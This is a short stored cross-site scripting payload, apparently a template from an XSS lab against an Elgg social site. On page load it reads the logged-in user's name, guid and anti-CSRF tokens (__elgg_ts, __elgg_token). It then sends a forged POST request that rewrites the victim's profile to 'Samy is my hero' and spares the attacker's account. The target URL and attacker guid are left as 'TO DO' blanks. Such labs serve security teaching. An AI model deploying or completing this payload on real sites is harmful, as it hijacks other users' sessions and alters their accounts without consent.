<script type="text/javascript">
window.onload = function(){
    // JavaScript code to access user name, user guid, Time Stamp __elgg_ts and Security Token __elgg_token
    var name="&name="+elgg.session.user.name;
    var guid="&guid="+elgg.session.user.guid;
    var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
    var token="&__elgg_token="+elgg.security.token.__elgg_token;
    var desc="&description=Samy is my hero" +
             "&accesslevel[description]=2";     

    // Construct your url.
    var sendurl =  //TO DO: FILL IN

    // Construct the content of your request.
    var content = token + ts + name + desc + guid; 

    // Send the HTTP POST request
    var samyGuid= ; // TO DO: FILL IN
    if (elgg.session.user.guid!=samyGuid)       // (1)
    {
        // Create and send Ajax request to modify profile
        var Ajax=null;
        Ajax=new XMLHttpRequest();
        Ajax.open("POST",sendurl,true);
        Ajax.setRequestHeader("Host","www.xsslabelgg.com");
        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        Ajax.send(content);
    }
}
</script>
